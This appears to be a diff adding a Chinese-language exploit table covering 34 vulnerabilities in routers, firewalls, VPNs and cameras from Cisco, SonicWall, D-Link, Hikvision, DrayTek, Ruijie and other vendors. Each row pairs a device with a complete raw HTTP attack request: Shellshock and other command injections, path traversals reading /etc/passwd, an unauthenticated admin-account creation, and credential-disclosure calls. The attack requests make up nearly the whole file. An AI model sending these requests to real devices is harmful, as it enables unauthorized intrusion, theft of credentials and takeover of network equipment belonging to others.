@@ -1,0 +1,406 @@
+序号	漏洞名称	品牌	设备型号	攻击数据包
+1	信息漏洞	Kyan 	网络监控设备
+GET /hosts HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+2	任意文件删除漏洞 CVE-2020-3187	CISCO	ASA设备、FTD设备
+GET /+CSCOE+/session_password.html HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+3	远程命令执行	SonicWall 	SSL-VPN 	
+GET /cgi-bin/jarrewrite.sh HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+4	任意文件读取	KEDACOM 	数字系统接入网	
+GET /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2 HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+5	任意文件下载漏洞	H3C  	SecPath下一代防火墙 	
+GET /webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+6	任意文件下载漏洞	H3C  	SecPath下一代防火墙
+GET /webui/?g=sys_dia_data_check&file_name=../../etc/passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+"
+7	远程命令执行	rConfig 	ajaxArchiveFiles.php	
+GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1
+Host: 
+Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71
+Cache-Control: max-age=0
+Sec-Ch-Ua: "" Not A;Brand"";v=""99"", ""Chromium"";v=""90"", ""Google Chrome"";v=""90""
+Sec-Ch-Ua-Mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Content-Length: 2
+
+8	任意用户创建漏洞	rConfig 	userprocess.php 	
+POST /lib/crud/userprocess.php HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc
+Upgrade-Insecure-Requests: 1
+Referer: http://www.wxxysyxx.com/useradmin.php
+Origin: http://www.wxxysyxx.com/
+Cookie: PHPSESSID=test
+Content-Length: 712
+
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""username""
+
+testtest
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""password""
+
+testtest@123
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""passconf""
+
+testtest@123
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""email""
+
+testtest@test.com
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""ulevelid""
+
+9
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""add""
+
+add
+--b1467349fcce4aa0ae8d44439f4e06bc
+Content-Disposition: form-data; name=""editid""
+
+
+--b1467349fcce4aa0ae8d44439f4e06bc--
+
+9	信息泄露漏洞	rConfig 	useradmin.inc.php 	
+GET /useradmin.inc.php HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+10	账号密码泄露漏洞 CVE-2019-17506	D-Link 	
+Dir-645
+getcfg.php"	"POST /getcfg.php HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Content-Length: 61
+
+SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1
+
+11	远程命令执行 CVE-2020-24581	D-Link 	DSL-28881A	
+GET /cgi-bin/execute_cmd.cgi?timestamp=test&cmd=whoami HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+12	信息泄露漏洞 CVE-2020-25078	D-Link	DCS系列监控DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703
+GET /config/getuser?index=0 HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+13	远程命令执行	D-Link	ShareCenter DNS-320 system_mgr.cgi	
+GET /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls; HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+14	后台任意文件读取漏洞 CNVD-2021-14544	HIKVISION	 流媒体管理服务器 	
+GET /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+15	 命令执行 HIKVISION	 流媒体管理服务器			
+GET /syscmd.asp HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+16	命令执行漏洞	Sapido	多款路由器	
+GET /syscmd.htm HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+17	远程命令执行漏洞 CVE-2019-12725	ZeroShell	ZeroShell < 3.9.0	
+GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27 HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+18	任意文件读取漏洞	MagicFlow 防火墙网关 main.xp 		
+GET /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+19	远程命令执行 CVE-2020-8515	DrayTek DrayTek企业网络设备
+Vigor2960 < v1.5.1
+Vigor300B < v1.5.1
+Vigor3900 < v1.5.1
+VigorSwitch20P2121 <= v2.3.2
+VigorSwitch20G1280 <= v2.3.2
+VigorSwitch20P1280 <= v2.3.2
+VigorSwitch20G2280 <= v2.3.2
+VigorSwitch20P2280 <= v2.3.2
+POST /cgi-bin/mainfunction.cgi HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+Origin: http://www.wxxysyxx.com
+Connection: close
+Referer: http://www.wxxysyxx.com/cgi-bin/mainfunction.cgi
+Upgrade-Insecure-Requests: 1
+
+action=login&keyPath=%27%0D%0A%2Fbin%2Fls%0D%0A%27&loginUser=a&loginPwd=a
+
+20	路径遍历漏洞	TVT数码科技 	NVMS-1000 	
+GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+Host: www.wxxysyxx.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+Connection: close
+
+21	密码泄露漏洞 CVE-2019-16313	蜂网互联	企业级路由器v4.31	
+GET /action/usermanager.htm HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+22	任意文件下载	FLIR-AX8 download.php 	FLIR-AX8	
+GET /download.php?file=/etc/passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+23	任意文件下载	FLIR-AX8			
+GET /cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect/etc/passwd%EF%BC%9A HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+24	网关目录遍历 CVE-2021-27328	朗视 	TG400 GSM 	
+GET /cgi/WebCGI?1404=../../../../../../../../../../etc/passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+25	远程命令执行漏洞	三星 	WLAN AP WEA453e路由器 	
+POST /(download)/tmp/a.txt HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://www.wxxysyxx.com
+Connection: close
+Referer: http://www.wxxysyxx.com/
+Upgrade-Insecure-Requests: 1
+
+command1=shell%3Acat+%2Fetc%2Fpasswd%7C+dd+of%3D%2Ftmp%2Fa.txt
+
+26	权限绕过信息泄露漏洞	飞鱼星 	企业级智能上网行为管理系统 	
+GET /request_para.cgi?parameter=wifi_info HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+27	任意文件下载	飞鱼星 	企业级智能上网行为管理系统 			
+GET /request_para.cgi?parameter=wifi_get_5g_host HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+28	任意文件下载	飞鱼星 	企业级智能上网行为管理系统			
+GET /request_para.cgi?parameter=wifi_get_2g_host HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+29	lib 任意文件读取漏洞	Huawei	HG659	
+GET /lib///....//....//....//....//....//....//....//....//etc//passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+30	任意文件下载漏洞	迈普	 ISG1000安全网关 	
+GET /webui/?g=sys_dia_data_down&file_name=../etc/passwd HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+31	远程命令执行漏洞 CNVD-2021-09650	锐捷 	NBR路由器 EWEB网管系统	
+POST /guest_auth/guestIsUp.php HTTP/1.1
+Host: www.wxxysyxx.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Origin: http://www.wxxysyxx.com
+Connection: close
+Referer: http://www.wxxysyxx.com/
+Upgrade-Insecure-Requests: 1
+
+mac=1&ip=127.0.0.1%7Ccat+%2Fetc%2Fpasswd+%3E+test.txt
+
+32	越权访问漏洞	锐捷	SSL VPN 	
+GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
+Host: www.wxxysyxx.com
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1
+
+33	目录遍历漏洞	锐捷	云课堂主机 	
+http://xxx.xxx.xxx.xxx/pool
+
+34	 远程命令执行漏洞	锐捷	EG易网关 cli.php	
+POST /cli.php?a=shell HTTP/1.1
+Host: 
+User-Agent: Go-http-client/1.1
+Content-Length: 24
+Content-Type: application/x-www-form-urlencoded
+Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; 
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip
+
+notdelay=true&command=id
